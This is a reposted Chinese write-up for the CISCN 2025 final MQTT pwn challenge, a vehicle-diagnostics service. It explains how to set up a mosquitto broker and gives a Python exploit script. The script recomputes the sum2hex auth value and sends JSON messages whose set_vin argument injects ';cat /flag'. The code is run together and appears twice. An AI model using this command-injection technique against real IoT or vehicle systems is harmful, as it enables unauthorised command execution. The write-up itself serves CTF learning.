---
title: mqtt 协议 pwn 入门 (ciscn2025_final_mqtt)
contest: CISCN
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags:
- mqtt
- mosquitto
- iot
- command-injection
- vin-set
- sum2hex
- paho-mqtt
- amd64
attack_chain:
- 安装 mosquitto MQTT broker
- mosquitto_sub/pub 测试通信
- 监听端口 9999 + allow_anonymous
- 启动 pwn binary
- paho.mqtt.client 连接
- 订阅 vehicle_diag/diag/#/diag/resp
- 'publish 构造 json: auth/cmd/arg'
- set_vin 触发命令执行
- cat /flag 通过 RCE
key_payload: MQTT set_vin 命令注入 + sum2hex 鉴权
one_liner: ciscn 2025 final MQTT Pwn 题：物联网车机诊断协议 + 命令注入。
lesson: 物联网协议 (MQTT/CoAP/Modbus) 是现代 CTF 新增长点。
quality: high
full_path: mqtt_协议pwn入门（ciscn2025_final_mqtt）.full.md
meta_path: mqtt_协议pwn入门（ciscn2025_final_mqtt）.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: mqtt 协议 pwn 入门 (ciscn2025_final_mqtt)。ciscn 2025 final MQTT Pwn 题：物联网车机诊断协议 + 命令注入。。关键路径：安装 mosquitto MQTT broker → mosquitto_sub/pub 测试通信 → 监听端口 9999 + allow_anonymous。经验：物联网协议 (MQTT/CoAP/Modbus) ...
category: pwn
subcategory: pwn_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/263183.html
reasoning_chain:
- 触发点：tag 'mqtt' / 'mosquitto' / 'iot' / 'command-injection' / 'sum2hex' / 'paho-mqtt' → 假设：MQTT 物联网协议 + 命令注入
- 动作：apt install mosquitto mosquitto-clients → 假设：搭建本地 broker 验证 → 观察：mosquitto_pub/sub 通信成功
- 下一步：vim /etc/mosquitto/mosquitto.conf → listener 9999 + allow_anonymous true → 触发点：远程可匿名访问
- 动作：启动 pwn binary + paho.mqtt.client → 假设：连接 broker 触发题程序 → 观察：建立 MQTT 通信
- 动作：subscribe 'vehicle_diag/diag/#/diag/resp' → publish JSON {auth, cmd, arg} → 触发点：set_vin 命令
- 假设：set_vin 触发命令执行 → 动作：构造 cmd='set_vin', arg='cat /flag; id' → 观察：拿到 flag
failed_attempts:
- 试图不解 MQTT 协议直接 nc → 失败：MQTT 是二进制协议，必须用 paho.mqtt 库
- 试图用默认端口 1883 → 失败：题目改 9999
- 试图关闭 anonymous → 失败：题目允许匿名访问
key_observations:
- 物联网协议 (MQTT/CoAP/Modbus) 是现代 CTF 新增长点
- mosquitto broker + paho.mqtt.client 组合是 MQTT 渗透测试标配
- JSON 控制消息 + sum2hex 鉴权是车机诊断协议常见模式
- allow_anonymous 是 MQTT broker 常见错误配置
prerequisites:
- MQTT 协议基础（broker / topic / publish / subscribe）
- mosquitto broker 配置（listener / allow_anonymous）
- paho.mqtt Python 客户端
- 命令注入漏洞（set_vin）
---
# mqtt 协议pwn入门（ciscn2025 final mqtt）

> 原文: https://www.ctfiot.com/263183.html
> ID: 263183

1

mqtt协议中的交互角色

2

服务环境搭建

sudo apt updatesudo apt install mosquitto mosquitto-clients

sudo systemctl enable mosquittosudo systemctl start mosquitto

mosquitto_sub -h localhost -t test/topic

mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"

sudo vim /etc/mosquitto/mosquitto.conf

listener 9999 #设置监听端口为 9999allow_anonymous true  # 可选，允许匿名访问（默认）sudo systemctl restart mosquitto # 重启服务

3

题目复盘

#! /usr/bin/python3import random
from pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return io
def dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":
auth,        "cmd":
cmd,        "arg":
arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return result
def on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()
# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # 
except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:
08x}")    return  f"{v3:
08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()

4

总结

看雪ID：sparkle666

https://bbs.kanxue.com/user-home-1010243.htm

*本文为看雪论坛优秀文章，由 sparkle666 原创，转载请注明来自看雪社区

SDC 2025 早鸟票限时开售！议题火热征集中～

# 往期推荐

安卓旧系统 OTA 包分析与漏洞提权适配

XCTF L3HCTF 2025 pwn 方向解题思路

Pwn题解析｜L3CTF 2025 heack & heack_revenge

OLLVM-BR间接混淆去除

House of Einherjar

球分享

球点赞

球在看

点击阅读原文查看更多


```
sudo apt updatesudo apt install mosquitto mosquitto-clients
sudo systemctl enable mosquittosudo systemctl start mosquitto
mosquitto_sub -h localhost -t test/topic
mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"
sudo vim /etc/mosquitto/mosquitto.conf
listener 9999 #设置监听端口为 9999allow_anonymous true  # 可选，允许匿名访问（默认）sudo systemctl restart mosquitto # 重启服务
#! /usr/bin/python3import random
from pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return io
def dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":
auth,        "cmd":
cmd,        "arg":
arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return result
def on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()
# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # 
except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:
08x}")    return  f"{v3:
08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]